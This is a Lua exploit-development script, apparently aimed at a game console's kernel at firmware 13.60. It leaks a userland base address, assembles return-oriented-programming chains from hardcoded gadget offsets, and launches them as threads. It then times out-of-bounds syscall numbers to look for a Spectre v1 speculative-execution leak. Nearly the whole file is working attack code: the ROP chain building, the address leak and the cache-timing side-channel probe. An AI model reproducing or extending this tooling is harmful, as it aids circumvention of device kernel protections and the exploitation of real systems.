-- CRASH_CLASS: MODERATE
-- PROBE 1199p: True OOB sysent — test past 13.60 table end (735 entries)
--
-- 1199o showed: sys677 delta=0, sys700 delta=9/5. Both return -1.
-- 13.60 table: 677-694 real, 695-699 nosys, 700-734 real. 735 entries total.
-- We need truly OOB numbers (>=735) to test Spectre v1 speculation.
--
-- Phase 0: fingerprint — which numbers are nosys vs real handler?
--   Test 695, 735, 750, 800, 1000, 4095 from parent to confirm survival.
-- Phase 1: cache timing comparison (counter child + measurement child):
--   [0..3]   getpid (20) — baseline
--   [4..7]   sys(695) — nosys on 13.60
--   [8..11]  sys(735) — first entry past 13.60 table
--   [12..15] sys(800) — clearly past any sysent
--   [16..19] sys(4095) — maximum test
--   [20..23] 50×getpid training + sys(800) — trained OOB
--   [24..27] 50×getpid training + sys(4095) — trained extreme OOB

print("=== PROBE 1199p: True OOB sysent range ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax     = eb + 0x992
local g_pop_rdi     = eb + 0xC9DFE
local g_pop_rsi     = eb + 0xD77D
local g_bare_ret    = eb + 0x42
local g_mov_m_rax   = eb + 0x92C67
local g_mov_rax_mem = eb + 0x1EEBB

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_mmap = mk(477)

-- =============================================
-- PHASE 0: Parent-side survival + fingerprint
-- =============================================
print("")
print("[Phase 0] OOB fingerprint from parent:")
local test_nums = {20, 677, 695, 700, 735, 750, 800, 1000, 4095}
for _, num in ipairs(test_nums) do
    local sc = mk(num)
    local ok_sc, rv_sc = pcall(function()
        return sc(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if not alive() then
        print(string.format("  sys(%4d): KILLED PROCESS", num))
        return
    end
    local rv_str = "pcall_fail"
    if ok_sc then
        local h, l = get_hi_lo(rv_sc)
        if h == 0xFFFFFFFF then rv_str = "-1"
        else rv_str = tostring(l) end
    end
    print(string.format("  sys(%4d): ok=%s rv=%s", num, tostring(ok_sc), rv_str))
end
print("  all survived")

-- =============================================
-- SHARED DATA
-- =============================================
local shared = memory.alloc(0x1000)
local sha = N(shared)
for i = 0, 0xFFC, 4 do wd(sha + i, 0) end

local counter_a   = sha
local done_ctr    = sha + 0x10
local done_meas   = sha + 0x18
local before_base = sha + 0x40
local after_base  = sha + 0x340
local ret_base    = sha + 0x640

-- Probe page
local probe_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(probe_page) >= 0xFFFF0000 then print("FATAL: probe mmap"); return end
local probe_a = N(probe_page)
wq(probe_a, uint64(0xBBBB0001))

-- =============================================
-- COUNTER CHAIN: 400K ticks
-- =============================================
local TICKS = 400000
local ctr_buf = sc_mmap(uint64(0), uint64(0x1000000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(ctr_buf) >= 0xFFFF0000 then print("FATAL: ctr mmap"); return end
local ctr_base = N(ctr_buf)
local ss_c = 0x1000
local rsp_c = ctr_base + ss_c - ((ctr_base + ss_c) % 16) - 8

local off = 0
local function ec(v) wq(rsp_c + off, v); off = off + 8 end

ec(g_pop_rdi); ec(uint64(129))
ec(g_pop_rsi); ec(uint64(N(fs_ptr)))
ec(g_pop_rax); ec(uint64(165))
ec(stub)
ec(g_pop_rdi); ec(uint64(counter_a))
for i = 1, TICKS do
    ec(g_pop_rax); ec(uint64(i))
    ec(g_mov_m_rax)
end
ec(g_pop_rdi); ec(uint64(done_ctr))
ec(g_pop_rax); ec(uint64(0xCAFE))
ec(g_mov_m_rax)
ec(g_pop_rdi); ec(uint64(0))
ec(g_pop_rax); ec(uint64(431))
ec(stub)
print(string.format("counter: %d ticks", TICKS))

-- =============================================
-- MEASUREMENT CHAIN
-- =============================================
local meas_buf = sc_mmap(uint64(0), uint64(0x800000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(meas_buf) >= 0xFFFF0000 then print("FATAL: meas mmap"); return end
local meas_base = N(meas_buf)
local ss_m = 0x2000
local rsp_m = meas_base + ss_m - ((meas_base + ss_m) % 16) - 8

local off_m = 0
local function em(v) wq(rsp_m + off_m, v); off_m = off_m + 8 end

em(g_pop_rdi); em(uint64(129))
em(g_pop_rsi); em(uint64(N(fs_ptr)))
em(g_pop_rax); em(uint64(165))
em(stub)

local function emit_prime(addr)
    em(g_pop_rax); em(uint64(addr))
    em(g_mov_rax_mem)
end

local function emit_probe(addr, idx)
    em(g_pop_rax); em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi); em(uint64(before_base + idx * 8))
    em(g_mov_m_rax)
    em(g_pop_rax); em(uint64(addr))
    em(g_mov_rax_mem)
    em(g_pop_rax); em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi); em(uint64(after_base + idx * 8))
    em(g_mov_m_rax)
end

local function emit_syscall(num)
    em(g_pop_rax); em(uint64(num))
    em(stub)
end

local function emit_syscall_save(num, idx)
    em(g_pop_rax); em(uint64(num))
    em(stub)
    em(g_pop_rdi); em(uint64(ret_base + idx * 8))
    em(g_mov_m_rax)
end

-- [0..3] getpid (baseline)
for i = 0, 3 do
    emit_prime(probe_a)
    emit_syscall(20)
    emit_probe(probe_a, i)
end

-- [4..7] sys(695) — nosys on 13.60
for i = 0, 3 do
    emit_prime(probe_a)
    emit_syscall_save(695, i)
    emit_probe(probe_a, 4 + i)
end

-- [8..11] sys(735) — first entry past 13.60 table
for i = 0, 3 do
    emit_prime(probe_a)
    emit_syscall_save(735, 4 + i)
    emit_probe(probe_a, 8 + i)
end

-- [12..15] sys(800) — clearly past
for i = 0, 3 do
    emit_prime(probe_a)
    emit_syscall_save(800, 8 + i)
    emit_probe(probe_a, 12 + i)
end

-- [16..19] sys(4095) — maximum
for i = 0, 3 do
    emit_prime(probe_a)
    emit_syscall_save(4095, 12 + i)
    emit_probe(probe_a, 16 + i)
end

-- [20..23] 50×train + sys(800) — trained OOB
for i = 0, 3 do
    emit_prime(probe_a)
    for t = 1, 50 do emit_syscall(20) end
    emit_syscall_save(800, 16 + i)
    emit_probe(probe_a, 20 + i)
end

-- [24..27] 50×train + sys(4095) — trained extreme OOB
for i = 0, 3 do
    emit_prime(probe_a)
    for t = 1, 50 do emit_syscall(20) end
    emit_syscall_save(4095, 20 + i)
    emit_probe(probe_a, 24 + i)
end

em(g_pop_rdi); em(uint64(done_meas))
em(g_pop_rax); em(uint64(0xBEEF))
em(g_mov_m_rax)
em(g_pop_rdi); em(uint64(0))
em(g_pop_rax); em(uint64(431))
em(stub)

print(string.format("measurement: 28 samples, %d bytes (%.1f KB)", off_m, off_m / 1024))

-- =============================================
-- LAUNCH
-- =============================================
print("")

local par_c = memory.alloc(0x40)
local pc_ = N(par_c)
for i = 0, 0x3C, 4 do wd(pc_ + i, 0) end
wq(pc_, g_bare_ret)
wq(pc_ + 0x10, uint64(ctr_base))
wq(pc_ + 0x18, uint64(ss_c))
local tid_c = memory.alloc(8); wq(N(tid_c), uint64(0))
wq(pc_ + 0x30, tid_c)

print("launching counter...")
pcall(function() mk(455)(uint64(pc_), uint64(0x38)) end)

local gate = 0
for p = 1, 50000 do
    local v = rd(counter_a) or 0
    if v > 0 then gate = v; break end
end
print(string.format("gate: counter=%d", gate))
if gate == 0 then print("ABORT"); return end

local par_m = memory.alloc(0x40)
local pm = N(par_m)
for i = 0, 0x3C, 4 do wd(pm + i, 0) end
wq(pm, g_bare_ret)
wq(pm + 0x10, uint64(meas_base))
wq(pm + 0x18, uint64(ss_m))
local tid_m = memory.alloc(8); wq(N(tid_m), uint64(0))
wq(pm + 0x30, tid_m)

print("launching measurement...")
pcall(function() mk(455)(uint64(pm), uint64(0x38)) end)

for w = 1, 300000 do local _ = rd(sha + 0x50) end

if not alive() then print("DEAD"); return end

local dm = rd(done_meas) or 0
print(string.format("done_meas=0x%X", dm))

-- =============================================
-- RESULTS
-- =============================================
print("")

local function read_delta(idx)
    local b = rq(before_base + idx * 8)
    local a = rq(after_base + idx * 8)
    local bh, bl = get_hi_lo(b)
    local ah, al = get_hi_lo(a)
    return al - bl, bl, al
end

local function read_ret(idx)
    local rv = rq(ret_base + idx * 8)
    if rv == nil then return "nil" end
    local h, l = get_hi_lo(rv)
    if h == 0xFFFFFFFF then return "-1" end
    return tostring(l)
end

local groups = {
    {name="getpid(20)",           start=0,  count=4, ret_start=nil},
    {name="sys(695) nosys?",      start=4,  count=4, ret_start=0},
    {name="sys(735) past-13.60",  start=8,  count=4, ret_start=4},
    {name="sys(800) deep-OOB",    start=12, count=4, ret_start=8},
    {name="sys(4095) max-OOB",    start=16, count=4, ret_start=12},
    {name="50×train+sys(800)",    start=20, count=4, ret_start=16},
    {name="50×train+sys(4095)",   start=24, count=4, ret_start=20},
}

local avgs = {}
for _, g in ipairs(groups) do
    print(string.format("[%s]:", g.name))
    local sum = 0
    for i = 0, g.count - 1 do
        local d = read_delta(g.start + i)
        sum = sum + d
        local rv_str = ""
        if g.ret_start then
            rv_str = "  ret=" .. read_ret(g.ret_start + i)
        end
        print(string.format("  [%d] delta=%2d%s", i, d, rv_str))
    end
    local avg = sum / g.count
    table.insert(avgs, {name=g.name, avg=avg})
    print("")
end

print("[SUMMARY]")
for _, a in ipairs(avgs) do
    print(string.format("  %-25s avg=%.1f ticks", a.name, a.avg))
end

-- Detect speculation signal
local baseline_avg = avgs[1].avg
local trained_800 = avgs[6].avg
local trained_4095 = avgs[7].avg
local untrained_800 = avgs[4].avg
local untrained_4095 = avgs[5].avg

print("")
if trained_800 > baseline_avg + 3 or trained_4095 > baseline_avg + 3 then
    print("** SPECULATIVE ACCESS DETECTED — trained OOB > baseline **")
    print(string.format("  trained(800)=%.1f  trained(4095)=%.1f  baseline=%.1f",
        trained_800, trained_4095, baseline_avg))
elseif untrained_800 < baseline_avg - 1 and untrained_4095 < baseline_avg - 1 then
    print("** OOB syscalls are LIGHTER than getpid — nosys fast path confirmed **")
    print("  True OOB numbers identified (sysent table verified)")
    local nosys_avg = avgs[2].avg
    if math.abs(untrained_800 - nosys_avg) < 1 then
        print(string.format("  sys(695)=%.1f ≈ sys(800)=%.1f → 695 is also nosys", nosys_avg, untrained_800))
    end
    if math.abs(untrained_800 - untrained_4095) < 1 then
        print(string.format("  sys(800)=%.1f ≈ sys(4095)=%.1f → same nosys path", untrained_800, untrained_4095))
    end
    print("")
    print("  No speculative signal — kernel likely has Spectre v1 mitigation")
    print("  (LFENCE/barrier after bounds check, or AMD microcode fix)")
else
    print("** MIXED RESULTS — need more data **")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 1199p COMPLETE ===")
